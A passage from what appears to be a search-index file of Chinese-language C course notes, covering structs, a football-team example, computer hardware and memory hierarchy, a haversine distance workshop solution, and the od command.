\u8c03\u8272\u76d8\u9996\u5148\u4e3e\u4f8b\u533f\u540d struct \u5176\u673a\u5236\uff1a</p> <p>C provides a mechanism to bring related data together, structures, using the struct keyword.</p> <pre><code>//  DEFINE AND INITIALIZE ONE VARIABLE THAT IS A STRUCTURE\nstruct {\n    char    *name;   // a pointer to a sequence of characters\n    int     red;     // in the range 0..255\n    int     green;\n    int     blue;\n} rgb_colour = {\n    \"DodgerBlue\",\n     30,\n    144,\n    255\n};\n\nprintf(\"Color name: %s\\n\", rgb_colour.name);\nprintf(\"RGB: (%d, %d, %d)\\n\", rgb_colour.red, rgb_colour.green, rgb_colour.blue);\n</code></pre> <p>\u533f\u540d\u7ed3\u6784\u4f53\u5728 struct \u540e\u6ca1\u6709\u6807\u660e\u7ed3\u6784\u4f53\u7c7b\u578b / \u6570\u636e\u7c7b\u578b\uff0c<code>{}</code> \u540e\u5b9a\u4e49\u4e86\u4e00\u4e2a variable, \u56e0\u6b64\u5728\u8c03\u7528\u7684\u65f6\u5019\u4e0d\u9700\u8981\u5148\u5bf9\u7ed3\u6784\u4f53\u8fdb\u884c\u6570\u636e\u7c7b\u578b\u58f0\u660e\u76f4\u63a5\u7528</p> <p>variable \u4e5f\u53ef\u4ee5\u662f\u6570\u7ec4\uff1a</p> <pre><code>struct myStructure s1[3] = {\n    {13, 'B', \"Some text\"},\n    {25, 'C', \"Another text\"},\n    {42, 'D', \"More text\"}\n};\n\nprintf(\"s1[0] - number: %d, letter: %c, text: %s\\n\", s1[0].number, s1[0].letter, s1[0].text);\nprintf(\"s1[1] - number: %d, letter: %c, text: %s\\n\", s1[1].number, s1[1].letter, s1[1].text);\n</code></pre>"},{"location":"cs/c/3.1/#multiple-football-teams","title":"Multiple football teams","text":"<p>\u8fd9\u4e2a\u6848\u4f8b\u5c31\u662f C11 \u4e2d struct \u533f\u540d\u51fd\u6570\u7684\u6570\u7ec4 variable \u7528\u6cd5</p> <p>\u591a\u4e2a TEAM \u7684\u5185\u5bb9\u90fd\u53ef\u88ab\u81ea\u5b9a\u4e49\uff0c\u7136\u540e\u5faa\u73af\u6253\u5370\u6bcf\u4e2a TEAM \u7684\u5143\u7d20</p> <pre><code>#include &lt;stdio.h&gt;\n\n#define MAX_TEAMS               3           // \u5b9a\u4e49\u961f\u4f0d\u6570\u91cf\n#define MAX_TEAMNAME_LEN        30          // \u6700\u5927\u961f\u4f0d\u540d\u79f0\u957f\u5ea6\n\n// \u5b9a\u4e49\u7403\u961f\u7684\u7ed3\u6784\u4f53\u6570\u7ec4\nstruct {\n    char    teamname[MAX_TEAMNAME_LEN+1];   // \u961f\u4f0d\u540d\u79f0\n    int     played;                         // \u6bd4\u8d5b\u573a\u6b21\n    int     won;                            // \u80dc\u573a\u6570\n    int     lost;                           // \u8d25\u573a\u6570\n    int     drawn;                          // \u5e73\u5c40\u573a\u6b21\n    int     bfor;                           // \u8fdb\u7403\u6570\n    int     bagainst;                       // \u5931\u7403\u6570\n    int     points;                         // \u79ef\u5206\n} team[MAX_TEAMS] = {\n    {\"Team A\", 10, 6, 2, 2, 20, 10, 20},    // \u5b9a\u4e49\u7b2c\u4e00\u4e2a\u961f\u4f0d\u7684\u6570\u636e\n    {\"Team B\", 12, 8, 3, 1, 25, 15, 25},    // \u5b9a\u4e49\u7b2c\u4e8c\u4e2a\u961f\u4f0d\u7684\u6570\u636e\n    {\"Team C\", 11, 5, 5, 1, 18, 18, 16}     // \u5b9a\u4e49\u7b2c\u4e09\u4e2a\u961f\u4f0d\u7684\u6570\u636e\n};\n\n// \u6253\u5370\u6240\u6709\u961f\u4f0d\u7684\u4fe1\u606f\nvoid printTeams() {\n    for (int i = 0; i &lt; MAX_TEAMS; i++) {\n        printf(\"Team Name: %s\\n\", team[i].teamname);\n        printf(\"Played: %d, Won: %d, Lost: %d, Drawn: %d\\n\", team[i].played, team[i].won, team[i].lost, team[i].drawn);\n        printf(\"Goals For: %d, Goals Against: %d, Points: %d\\n\", team[i].bfor, team[i].bagainst, team[i].points);\n        printf(\"--------------------------\\n\");\n    }\n}\n\nint main() {\n    printTeams();   // \u8c03\u7528\u51fd\u6570\u6253\u5370\u961f\u4f0d\u4fe1\u606f\n    return 0;\n}\n</code></pre> <p>\u8fd9\u6837\u7ba1\u7406\u5b9a\u4e49\u6781\u5176\u65b9\u4fbf\uff0c\u5982\u679c\u662f\u975e\u533f\u540d\u51fd\u6570\uff1a</p> <pre><code>#include &lt;stdio.h&gt;\n\n#define MAX_TEAMS               3           // \u5b9a\u4e49\u961f\u4f0d\u6570\u91cf\n#define MAX_TEAMNAME_LEN        30          // \u6700\u5927\u961f\u4f0d\u540d\u79f0\u957f\u5ea6\n\n// \u5b9a\u4e49\u4e00\u4e2a\u7ed3\u6784\u4f53\u7c7b\u578b Team\nstruct Team {\n    char    teamname[MAX_TEAMNAME_LEN+1];   // \u961f\u4f0d\u540d\u79f0\n    int     played;                         // \u6bd4\u8d5b\u573a\u6b21\n    int     won;                            // \u80dc\u573a\u6570\n    int     lost;                           // \u8d25\u573a\u6570\n    int     drawn;                          // \u5e73\u5c40\u573a\u6b21\n    int     bfor;                           // \u8fdb\u7403\u6570\n    int     bagainst;                       // \u5931\u7403\u6570\n    int     points;                         // \u79ef\u5206\n};\n\n// \u5b9a\u4e49 Team \u7c7b\u578b\u7684\u6570\u7ec4\nstruct Team team[MAX_TEAMS] = {\n    {\"Team A\", 10, 6, 2, 2, 20, 10, 20},    // \u7b2c\u4e00\u4e2a\u961f\u4f0d\n    {\"Team B\", 12, 8, 3, 1, 25, 15, 25},    // \u7b2c\u4e8c\u4e2a\u961f\u4f0d\n    {\"Team C\", 11, 5, 5, 1, 18, 18, 16}     // \u7b2c\u4e09\u4e2a\u961f\u4f0d\n};\n\n// \u6253\u5370\u6240\u6709\u961f\u4f0d\u7684\u4fe1\u606f\nvoid printTeams() {\n    for (int i = 0; i &lt; MAX_TEAMS; i++) {\n        printf(\"Team Name: %s\\n\", team[i].teamname);\n        printf(\"Played: %d, Won: %d, Lost: %d, Drawn: %d\\n\", team[i].played, team[i].won, team[i].lost, team[i].drawn);\n        printf(\"Goals For: %d, Goals Against: %d, Points: %d\\n\", team[i].bfor, team[i].bagainst, team[i].points);\n        printf(\"--------------------------\\n\");\n    }\n}\n\nint main() {\n    printTeams();   // \u8c03\u7528\u51fd\u6570\u6253\u5370\u961f\u4f0d\u4fe1\u606f\n    return 0;\n}\n</code></pre> <p>\u53ef\u4ee5\u770b\u89c1\u9700\u8981\u53e6\u5916\u518d\u58f0\u660e variable \u540e\u8fdb\u884c assignment</p> <p>\u5982\u679c\u4e0d\u4f7f\u7528 struct \u7ed3\u6784\uff0c\u90a3\u5c31\u8981\u624b\u52a8\u91cd\u590d\u53bb\u5b9a\u4e49\u7ba1\u7406\u6240\u6709\u961f\u4f0d\uff1a</p> <pre><code>//  DEFINE THE LIMITS ON PROGRAM'S DATA-STRUCTURES\n#define MAX_TEAMS               24\n#define MAX_TEAMNAME_LEN        30\n....\n\n//  DEFINE A 2-DIMENSIONAL ARRAY HOLDING OUR UNIQUE TEAMNAMES\nchar    teamname[MAX_TEAMS][MAX_TEAMNAME_LEN+1];        // +1 for null-byte\n\n//  STATISTICS FOR EACH TEAM, INDEXED BY EACH TEAM'S 'TEAM NUMBER'\nint     played  [MAX_TEAMS];\nint     won     [MAX_TEAMS];\nint     lost    [MAX_TEAMS];\nint     drawn   [MAX_TEAMS];\nint     bfor    [MAX_TEAMS];\nint     bagainst[MAX_TEAMS];\nint     points  [MAX_TEAMS];\n....\n\n//  PRINT EACH TEAM'S RESULTS, ONE-PER-LINE, IN NO SPECIFIC ORDER\nfor(int t=0 ; t&lt;nteams ; ++t) {\n    printf(\"%s %i %i %i %i %i %i %.2f %i\\n\", // %age to 2 decimal-places\n            teamname[t],\n            played[t], won[t], lost[t], drawn[t],\n            bfor[t], bagainst[t],\n            (100.0 * bfor[t] / bagainst[t]),      // calculate percentage\n            points[t]);\n}\n</code></pre>"},{"location":"cs/c/3.1/#accessing-system-information-using-structures","title":"Accessing system information using structures","text":"<p>\u64cd\u4f5c\u7cfb\u7edf\u7684\u4fe1\u606f\u88ab\u85cf\u5728 <code>/usr/include</code> \u548c\u5176 <code>/usr/include/sys</code> \u4e2d</p> <p>\u6211\u4eec\u7528\u975e\u533f\u540d\u51fd\u6570\u4f5c\u6f14\u793a\u4f5c\u6700\u540e\u6536\u5c3e\uff1a</p> <pre><code>#include &lt;stdio.h&gt;\n#include &lt;sys/time.h&gt;\n\nstruct timeval {\n    int  tv_sec;       // Seconds\n    int  tv_usec;      // Microseconds\n};\n\nstruct timeval start_time;\nstruct timeval stop_time;\n\ngettimeofday(&amp;start_time, NULL);\nprintf(\"program started at %i.06%i\\n\",\n       (int)start_time.tv_sec, (int)start_time.tv_usec);\n</code></pre> <p>\u6309\u5730\u5740\u4f20\u9012\u7ed3\u6784\uff0c\u4f7f\u7528 &amp; \u8fd0\u7b97\u7b26\uff0c \u4f7f\u5f97 gettimeofday\uff08\uff09\u51fd\u6570\uff0c\u7b2c\u4e8c\u4e2a\u65f6\u533a\u4fe1\u606f\u7531\u4e8e\u4e0d\u611f\u5174\u8da3\u6240\u4ee5\u8bbe\u7f6e\u4e3a NULL</p>"},{"location":"cs/c/3.2/","title":"3.2 Computer Hardware","text":""},{"location":"cs/c/3.2/#wed-lecture","title":"Wed Lecture","text":"<p>\u4e3b\u8981\u8bb2\u8ff0\u8ba1\u7b97\u673a\u7ed3\u6784\u4f53\u7cfb\u4e2d\u7684\u77e5\u8bc6\uff0c\u76f4\u5230 Week 4 Mon \u5168\u90e8\u8bb2\u5b8c  </p>"},{"location":"cs/c/3.2/#main-structural-components","title":"Main Structural Components","text":"<ol> <li> <p>\u4e2d\u592e\u5904\u7406\u5668 (CPU - Central Processing Unit)    - \u6267\u884c\u7b97\u672f\u548c\u903b\u8f91\u8ba1\u7b97 (Arithmetic and Logical Computation)\u3002    - \u7ba1\u7406\u5927\u90e8\u5206\u5185\u5b58\u548c\u5916\u56f4\u8bbe\u5907\u7684\u8f93\u5165\u8f93\u51fa (Input and Output Services)\u3002    - \u53ef\u80fd\u6709\u591a\u4e2a\u5904\u7406\u5668 (Multiple Processors) \u5171\u540c\u6267\u884c\u64cd\u4f5c\u7cfb\u7edf\u6216\u5e94\u7528\u7a0b\u5e8f (Operating System or User/Application Programs)\u3002</p> </li> <li> <p>\u4e3b\u5b58\u50a8\u5668 (RAM - Random Access Memory)    - \u5b58\u50a8\u6307\u4ee4\u548c\u6570\u636e (Instructions and Data)\u3002    - \u5904\u7406\u5668\u5728\u7a0b\u5e8f\u7684\u6307\u5bfc\u4e0b\u8bfb\u53d6\u548c\u5199\u5165\u5185\u5b58\u4e2d\u7684\u6570\u636e (Read and Write Memory as Directed by Programs)\u3002</p> </li> <li> <p>\u8f85\u52a9\u5b58\u50a8\u5668\u548c\u5916\u56f4\u8bbe\u5907 (Secondary Storage and Peripheral Devices)    - \u63d0\u4f9b\u957f\u671f\u3001\u6301\u4e45\u7684\u6570\u636e\u5b58\u50a8 (Long-term Persistent Storage)\uff0c\u5982\u78c1\u76d8 (Disks)\u3001\u78c1\u5e26 (Tapes)\u3002    - \u5305\u542b\u8f93\u5165/\u8f93\u51fa\u6a21\u5757\u548cI/O\u63a7\u5236\u5668 (I/O Controllers)\u3002</p> </li> <li> <p>\u7cfb\u7edf\u603b\u7ebf (System Bus)    - \u8fde\u63a5\u5904\u7406\u5668\u3001\u4e3b\u5185\u5b58\u548cI/O\u8bbe\u5907 (Connects Processor, Main Memory, and I/O Devices)\u3002    - \u5145\u5f53\u6570\u636e\u4f20\u8f93\u7684\u201c\u9ad8\u901f\u516c\u8def\u201d (Data \"Highway\")\u3002    - \u53ea\u6709\u4e00\u4e2a\u7ec4\u4ef6\u53ef\u4ee5\u63a7\u5236\u603b\u7ebf (Only One Component Can Control the Bus)\uff0c\u901a\u5e38\u901a\u8fc7\u603b\u7ebf\u4ef2\u88c1\u51b3\u5b9a (Bus Arbitration)\u3002</p> </li> </ol>"},{"location":"cs/c/3.2/#processor-registers","title":"Processor Registers","text":"<ul> <li>\u5bc4\u5b58\u5668 \u662f\u5904\u7406\u5668\u5185\u90e8\u7684\u975e\u5e38\u5feb\u901f\u7684\u5b58\u50a8\u4f4d\u7f6e (Fast Memory Locations Inside the Processor)\u3002</li> <li>\u8bbf\u95ee\u65f6\u95f4\u901a\u5e38\u4e3a 0.5-3 \u7eb3\u79d2 (Access Time: 0.5-3 ns)\u3002</li> <li>\u5982\u679c\u6570\u636e\u5728\u5bc4\u5b58\u5668\u4e2d\u800c\u4e0d\u662f\u5728\u4e3b\u5185\u5b58\u4e2d\uff0c\u7a0b\u5e8f\u6267\u884c\u901f\u5ea6\u53ef\u80fd\u63d0\u9ad8 10-500 \u500d (Execution Speed Improvement: 10-500X)\u3002</li> <li>\u5904\u7406\u5668\u5bc4\u5b58\u5668\u7684\u6570\u91cf\u548c\u5bbd\u5ea6\uff08\u5982 64 \u4f4d\u5bc4\u5b58\u5668\uff09\u5f71\u54cd CPU \u7684\u6027\u80fd\u548c\u901f\u5ea6 (Number and Width of Registers Affect CPU Performance)\u3002</li> </ul> <ul> <li>\u5bc4\u5b58\u5668\u7c7b\u578b (Register Types)\uff1a   1. \u7528\u6237\u53ef\u8bbf\u95ee\u5bc4\u5b58\u5668 (User-Accessible Registers)\uff1a<ul> <li>\u6570\u636e\u5bc4\u5b58\u5668 (Data Registers)\uff1a\u5b58\u50a8\u6570\u636e\u503c\u548c\u8fd0\u7b97\u7ed3\u679c (Hold Values Before and After Instructions)\u3002</li> <li>\u5730\u5740\u5bc4\u5b58\u5668 (Address Registers)\uff1a\u5b58\u50a8\u5185\u5b58\u4f4d\u7f6e\u7684\u5730\u5740 (Hold Addresses of Memory Locations)\uff08\u5982 MAR\u3001MBR\u3001\u7d22\u5f15\u5bc4\u5b58\u5668\u3001\u6808\u6307\u9488\uff09\u3002</li> </ul> </li> </ul> <ol> <li>\u63a7\u5236\u548c\u72b6\u6001\u5bc4\u5b58\u5668 (Control and Status Registers)\uff1a<ul> <li>\u5b58\u50a8\u5904\u7406\u5668\u72b6\u6001 (Processor Status)\uff08\u5982\u6307\u4ee4\u5bc4\u5b58\u5668 IR\u3001\u7a0b\u5e8f\u8ba1\u6570\u5668 PC\uff09\u3002</li> <li>\u5904\u7406\u5668\u72b6\u6001\u5b57 (PSW - Processor Status Word) \u8bb0\u5f55\u5904\u7406\u5668\u72b6\u6001\u548c\u64cd\u4f5c\u7ed3\u679c (Records Processor Status and Operation Results)\uff08\u5982\u6ea2\u51fa\u3001\u8fdb\u4f4d\u3001\u9664\u96f6\u9519\u8bef\uff09\u3002</li> </ul> </li> </ol>"},{"location":"cs/c/3.2/#memory-hierarchy","title":"Memory Hierarchy","text":"<ul> <li>\u5185\u5b58\u5c42\u6b21\u7ed3\u6784 \u901a\u8fc7\u4e0d\u540c\u5c42\u6b21\u7684\u5185\u5b58\u6765\u5e73\u8861\u6210\u672c\u3001\u5bb9\u91cf\u548c\u8bbf\u95ee\u65f6\u95f4 (Balancing Cost, Capacity, and Access Time)\uff1a</li> <li>\u5bc4\u5b58\u5668\uff1a\u6700\u5feb\uff0c\u5b58\u50a81-4KB\u6570\u636e (Fastest, 1-4KB Data)\u3002</li> <li>L1/L2/L3 \u7f13\u5b58\uff1a\u6bd4\u4e3b\u5185\u5b58\u66f4\u5feb\uff0c\u5bb9\u91cf\u4ece8KB\u523064MB\u4e0d\u7b49 (Caches: 8KB-64MB)\u3002</li> <li>\u4e3b\u5185\u5b58 (RAM)\uff1a\u8f83\u5927\u5bb9\u91cf\uff0c\u8bbf\u95ee\u65f6\u95f410-60\u7eb3\u79d2 (Larger Capacity, 10-60 ns Access Time)\u3002</li> <li>\u786c\u76d8\uff1a\u6700\u6162\uff0c\u5bb9\u91cf\u6700\u5927\uff0c\u8bbf\u95ee\u65f6\u95f4\u4e3a3M-10M\u7eb3\u79d2 (Hard Disk: Slowest, Largest Capacity, 3M-10M ns Access Time)\u3002</li> <li>\u56fa\u6001\u786c\u76d8 (SSD - Solid-State Disk)\uff1a\u4ecb\u4e8e\u4e3b\u5185\u5b58\u548c\u786c\u76d8\u4e4b\u95f4\uff0c\u8bbf\u95ee\u65f6\u95f4\u4e3a0.5M-1M\u7eb3\u79d2 (Intermediate Between RAM and Hard Disk, 0.5M-1M ns Access Time)\u3002</li> </ul>"},{"location":"cs/c/3.2/#data-rates-and-byte-interpretation","title":"Data Rates and Byte Interpretation","text":"<ul> <li>\u57fa\u672c\u6570\u636e\u5355\u5143 (Basic Data Units)\uff1a</li> <li>\u6bd4\u7279 (Bit)\uff1a\u6700\u5c0f\u7684\u6570\u636e\u5355\u5143 (Smallest Data Unit)\u3002</li> <li>\u5b57\u8282 (Byte)\uff1a\u901a\u5e38\u4e3a8\u4f4d\uff0c\u6bd4\u7279\u7684\u57fa\u672c\u7ec4\u5408\u5355\u5143 (Typically 8 Bits)\u3002</li> <li>\u5b57 (Word)\uff1a\u5904\u7406\u5668\u7684\u9ed8\u8ba4\u6570\u636e\u5927\u5c0f (Default Data Size for Processor)\uff1b\u5e38\u89c1\u4e3a32\u4f4d\u621664\u4f4d (Common Word Sizes: 32 or 64 Bits)\u3002</li> </ul> <ul> <li>\u6570\u636e\u89e3\u91ca (Data Interpretation)\uff1a</li> <li>\u6570\u636e\u7684\u542b\u4e49\u53d6\u51b3\u4e8e\u4e0a\u4e0b\u6587 (Meaning Depends on Context)\uff0c\u4f8b\u5982\uff1a<ul> <li>\u4e00\u4e3232\u4f4d\u7684\u4f4d\u6a21\u5f0f\u53ef\u80fd\u8868\u793aASCII\u5b57\u7b26\u300132\u4f4d\u6574\u6570\u3001\u6d6e\u70b9\u503c\u6216\u5185\u5b58\u5730\u5740 (32-bit Pattern Could Represent ASCII Characters, 32-bit Integer, Floating Point Value, or Memory Address)\u3002</li> <li>\u9519\u8bef\u7684\u89e3\u91ca\u4f1a\u5bfc\u81f4\u5904\u7406\u5668\u9519\u8bef (Errors in Interpretation Can Cause Processor Faults)\u3002</li> </ul> </li> </ul>"},{"location":"cs/c/3.2/#workshop","title":"Workshop","text":"<p>\u8fd9\u4e2a\u4f5c\u4e1a\u91cd\u70b9\u662f\u7528 C11 \u5f00\u53d1\u51fd\u6570\u6765\u8ba1\u7b97\u5730\u7403\u8868\u9762\u4e0a\u4e24\u70b9\u4e4b\u95f4\u7684\u8ddd\u79bb\uff0c\u4f7f\u7528\u7684\u662fhaversine \u516c\u5f0f\u3002</p> <ol> <li>\u521b\u5efa\u6570\u636e\u7ed3\u6784\uff1a</li> </ol> <ul> <li>\u5b9a\u4e49\u4e00\u4e2a C11 \u7ed3\u6784\u4f53\uff0c\u7528\u6765\u8868\u793a\u5730\u7403\u4e0a\u7684\u4e00\u4e2a\u5730\u7406\u70b9\uff08\u5373\u7eac\u5ea6\u548c\u7ecf\u5ea6\uff09\u3002\u8fd9\u5c06\u4e3a\u4f60\u63d0\u4f9b\u4e00\u4e2a\u5b58\u50a8\u8fd9\u4e9b\u6570\u636e\u7684\u65b9\u5f0f\u3002</li> </ul> <ol> <li>\u5f00\u53d1\u4e09\u4e2a\u51fd\u6570\uff1a</li> </ol> <ul> <li>degrees_to_radians(double degrees)\u2014\u2014\u4e00\u4e2a\u5c06\u89d2\u5ea6\u8f6c\u6362\u4e3a\u5f27\u5ea6\u7684\u51fd\u6570\uff08\u56e0\u4e3a\u8fd9\u4e2a\u516c\u5f0f\u662f\u57fa\u4e8e\u5f27\u5ea6\u8ba1\u7b97\u7684\uff09\u3002</li> </ul> <ul> <li>valid_location(struct point location)\u2014\u2014\u4e00\u4e2a\u51fd\u6570\uff0c\u7528\u6765\u68c0\u67e5\u4e00\u4e2a\u7ed9\u5b9a\u7684\u4f4d\u7f6e\u662f\u5426\u5408\u6cd5\uff08\u4f8b\u5982\uff0c\u7eac\u5ea6\u5fc5\u987b\u5728 -90\u00b0 \u5230 90\u00b0 \u4e4b\u95f4\uff09\u3002</li> </ul> <ul> <li>haversine(struct point location1, struct point location2)\u2014\u2014\u4e3b\u8981\u51fd\u6570\uff0c\u7528\u6765\u8ba1\u7b97\u4e24\u70b9\u4e4b\u95f4\u7684\u8ddd\u79bb\u3002</li> </ul> <ol> <li>\u8bbe\u8ba1\u547d\u4ee4\u884c\u5de5\u5177\uff1a</li> </ol> <ul> <li>\u5b9e\u73b0\u7a0b\u5e8f\uff0c\u63a5\u53d7\u4ece\u547d\u4ee4\u884c\u4f20\u5165\u7684\u5750\u6807\u5bf9\uff0c\u8fd4\u56de\u8ba1\u7b97\u51fa\u7684\u8ddd\u79bb\uff08\u4ee5\u7c73\u4e3a\u5355\u4f4d\uff09\u3002</li> </ul> <ol> <li>\u6d4b\u8bd5\u5e76\u6269\u5c55\uff1a</li> </ol> <ul> <li>\u9996\u5148\uff0c\u8ba1\u7b97\u4e24\u70b9\u4e4b\u95f4\u7684\u8ddd\u79bb\u3002</li> </ul> <ul> <li>\u7136\u540e\uff0c\u5f00\u53d1\u53e6\u4e00\u4e2a\u5de5\u5177\uff0c\u7528\u4e8e\u5904\u7406\u591a\u4e2a\u70b9\uff0c\u8ba1\u7b97\u4ece\u7b2c\u4e00\u4e2a\u70b9\u5230\u6700\u540e\u4e00\u4e2a\u70b9\u7684\u8ddd\u79bb\uff0c\u8def\u5f84\u6cbf\u9014\u7ecf\u8fc7\u6240\u6709\u70b9\u3002</li> </ul>"},{"location":"cs/c/3.2/#vim-template","title":"VIM Template","text":"<p>\u6559\u6388\u76f4\u63a5\u6267\u884c <code>\\vc</code> \u5c31\u5f00\u4e86\u4e00\u4e2a\u80fd\u591f\u5feb\u901f\u7f16\u5199 C \u4ee3\u7801\u7684\u6a21\u7248\uff0c\u8fd9\u79cd\u7f16\u5199\u6a21\u7248\u53ef\u4ee5\u81ea\u5df1\u5728\u67d0\u5904\u521b\u5efa\u4e00\u4e2a blank.c \u505a\u5230</p>"},{"location":"cs/c/3.2/#solutions","title":"Solutions","text":"<pre><code>#include &lt;stdio.h&gt;\n#include &lt;stdlib.h&gt;\n#include &lt;math.h&gt;\n#include &lt;stdbool.h&gt;\n\n// \u5b9a\u4e49\u5730\u7403\u534a\u5f84\uff0c\u5355\u4f4d\u4e3a\u7c73\n#define EARTH_RADIUS 6371000\n\n// \u5b9a\u4e49\u7ed3\u6784\u4f53\uff0c\u8868\u793a\u5730\u7403\u4e0a\u7684\u4e00\u4e2a\u70b9\uff08\u5373\u4e00\u4e2a\u5730\u7406\u4f4d\u7f6e\uff1a\u7eac\u5ea6\u548c\u7ecf\u5ea6\uff09\nstruct point {\n    double latitude;\n    double longitude;\n};\n\n// \u5c06\u89d2\u5ea6\u8f6c\u6362\u4e3a\u5f27\u5ea6\u7684\u51fd\u6570\ndouble degrees_to_radians(double degrees) {\n    return degrees * M_PI / 180.0;\n}\n\n// \u68c0\u67e5\u4e00\u4e2a\u70b9\u662f\u5426\u5408\u6cd5\u7684\u51fd\u6570\uff08\u7eac\u5ea6\u5fc5\u987b\u5728-90\u523090\u4e4b\u95f4\uff0c \u7ecf\u5ea6\u5fc5\u987b\u5728-180\u5230180\u4e4b\u95f4\uff09\nbool valid_location(struct point location) {\n    return location.latitude &gt;= -90 &amp;&amp; location.latitude &lt;= 90 &amp;&amp;\n           location.longitude &gt;= -180 &amp;&amp; location.longitude &lt;= 180;\n}\n\n// \u4f7f\u7528 haversine \u516c\u5f0f\u8ba1\u7b97\u4e24\u70b9\u4e4b\u95f4\u7684\u8ddd\u79bb\ndouble haversine(struct point location1, struct point location2) {\n    double lat1 = degrees_to_radians(location1.latitude);\n    double lon1 = degrees_to_radians(location1.longitude);\n    double lat2 = degrees_to_radians(location2.latitude);\n    double lon2 = degrees_to_radians(location2.longitude);\n\n    double dlat = lat2 - lat1;\n    double dlon = lon2 - lon1;\n\n    // haversine \u516c\u5f0f\n    double a = sin(dlat / 2) * sin(dlat / 2) +\n               cos(lat1) * cos(lat2) *\n               sin(dlon / 2) * sin(dlon / 2);\n    double c = 2 * atan2(sqrt(a), sqrt(1 - a));\n\n    return EARTH_RADIUS * c;\n}\n\n// \u547d\u4ee4\u884c\u5de5\u5177\uff1a\u8ba1\u7b97\u4e24\u70b9\u4e4b\u95f4\u7684\u8ddd\u79bb\nint main(int argc, char *argv[]) {\n    if (argc != 5) {\n        printf(\"Usage: %s lat1 lon1 lat2 lon2\\n\", argv[0]);\n        return 1;\n    }\n\n    struct point location1, location2;\n\n    // \u4ece\u547d\u4ee4\u884c\u53c2\u6570\u8bfb\u53d6\u4f4d\u7f6e\n    location1.latitude = atof(argv[1]);\n    location1.longitude = atof(argv[2]);\n    location2.latitude = atof(argv[3]);\n    location2.longitude = atof(argv[4]);\n\n    // \u9a8c\u8bc1\u8f93\u5165\u7684\u4f4d\u7f6e\u662f\u5426\u5408\u6cd5\n    if (!valid_location(location1) || !valid_location(location2)) {\n        printf(\"Invalid location coordinates.\\n\");\n        return 1;\n    }\n\n    // \u8ba1\u7b97\u4e24\u70b9\u4e4b\u95f4\u7684\u8ddd\u79bb\n    double distance = haversine(location1, location2);\n    printf(\"Distance: %.0f metres\\n\", distance);\n\n    return 0;\n}\n</code></pre>"},{"location":"cs/c/3.3/","title":"3.3 Functions","text":"<p>lab \u6682\u65f6\u6ca1\u65f6\u95f4\u901f\u5237\u4e86\uff0c\u6401\u7f6e\u5148\u770b Week 4 + Week 5 \u7684\u4e09\u8282\u8bfe</p>"},{"location":"cs/c/4.1/","title":"4.1 Computer Architecture","text":""},{"location":"cs/c/4.1/#mon-lecture","title":"Mon Lecture","text":"<p>Mon \u7684 Lecture \u5ef6\u7eed 3.2 \u7684\u5185\u5bb9\uff0c\u76f8\u5173\u62bd\u8c61\u7b14\u8bb0\u67e5\u770b Chapter 3.2 \u5373\u53ef\uff0c\u6700\u540e\u4ecb\u7ecd\u4e86\u4e00\u4e2a\u53eb <code>od</code> \u7684\u5de5\u5177\uff0c\u8001\u5e08\u4e5f\u62d3\u5c55\u4e86\uff1a</p> <p><code>od</code> \u662f Unix \u548c\u7c7b Unix \u64cd\u4f5c\u7cfb\u7edf\u4e2d\u7684\u4e00\u4e2a\u547d\u4ee4\u884c\u5de5\u5177\uff0c\u5168\u79f0\u4e3a octal dump\uff0c\u5b83\u7528\u4e8e\u4ee5\u516b\u8fdb\u5236\uff08\u6216\u5176\u4ed6\u8fdb\u5236\uff09\u7684\u5f62\u5f0f\u67e5\u770b\u6587\u4ef6\u6216\u6570\u636e\u7684\u5185\u5bb9\u3002<code>od</code> \u53ef\u4ee5\u663e\u793a\u6587\u4ef6\u4e2d\u7684\u5b57\u8282\u6216\u6570\u636e\u5757\uff0c\u5e76\u5c06\u5b83\u4eec\u4ee5\u516b\u8fdb\u5236\u3001\u5341\u516d\u8fdb\u5236\u3001\u5341\u8fdb\u5236\u3001\u4e8c\u8fdb\u5236\u6216 ASCII \u683c\u5f0f\u8f93\u51fa\u3002</p>"},{"location":"cs/c/4.1/#_1","title":"\u5e38\u89c1\u9009\u9879\uff1a","text":"<ul> <li><code>-b</code>\uff1a\u4ee5\u5b57\u8282\u7684\u516b\u8fdb\u5236\u683c\u5f0f\u8f93\u51fa\u3002</li> <li><code>-x</code>\uff1a\u4ee5\u5341\u516d\u8fdb\u5236\u683c\u5f0f\u8f93\u51fa\u3002</li> <li><code>-d</code>\uff1a\u4ee5\u5341\u8fdb\u5236\u683c\u5f0f\u8f93\u51fa\u3002</li> <li><code>-c</code>\uff1a\u5c06\u6bcf\u4e2a\u5b57\u8282\u663e\u793a\u4e3a ASCII \u5b57\u7b26\u3002</li> </ul>"},{"location":"cs/c/4.1/#_2","title":"\u793a\u4f8b\uff1a","text":"<p>\u8fd0\u884c\u4ee5\u4e0b\u547d\u4ee4\uff1a <pre><code>od -b /bin/ls\n</code></pre></p> <p>\u8be5\u547d\u4ee4\u4f1a\u4ee5\u516b\u8fdb\u5236\u5b57\u8282\u8868\u793a\u6cd5\uff0c\u67e5\u770b <code>/bin/ls</code> \u6587\u4ef6\uff08\u8fd9\u662f\u7cfb\u7edf\u4e0a\u6267\u884c <code>ls</code> \u547d\u4ee4\u7684\u4e8c\u8fdb\u5236\u6587\u4ef6\uff09\u7684\u5185\u5bb9\u3002</p>"},{"location":"cs/c/4.1/#_3","title":"\u8f93\u51fa\u89e3\u91ca\uff1a","text":"<p>\u8f93\u51fa\u7684\u6bcf\u4e00\u884c\u901a\u5e38\u5305\u542b\u4e24\u4e2a\u90e8\u5206\uff1a 1. \u5de6\u4fa7\u7684\u5730\u5740\u504f\u79fb\u91cf\uff0c\u8868\u793a\u6587\u4ef6\u4e2d\u7684\u4f4d\u7f6e\u3002 2. \u53f3\u4fa7\u7684\u516b\u8fdb\u5236\u503c\uff0c\u8868\u793a\u6587\u4ef6\u4e2d\u7684\u5b57\u8282\u5185\u5bb9\u3002</p> <p>\u4f8b\u5982\uff0c\u8f93\u51fa\u7684\u4e00\u90e8\u5206\u53ef\u80fd\u662f\u8fd9\u6837\u7684\uff1a <pre><code>0000000 177 105 114 106 002 001 001 000\n0000010 000 000 000 000 000 000 000 000\n</code></pre></p> <ul> <li><code>0000000</code> \u548c <code>0000010</code> \u8868\u793a\u6587\u4ef6\u7684\u5b57\u8282\u504f\u79fb\u4f4d\u7f6e\u3002</li> <li><code>177 105 114 ...</code> \u662f\u6587\u4ef6\u7684\u5b57\u8282\u503c\uff0c\u4ee5\u516b\u8fdb\u5236\u8868\u793a\u3002</li> </ul>"},{"location":"cs/c/4.1/#_4","title":"\u5e94\u7528\u573a\u666f\uff1a","text":"<ul> 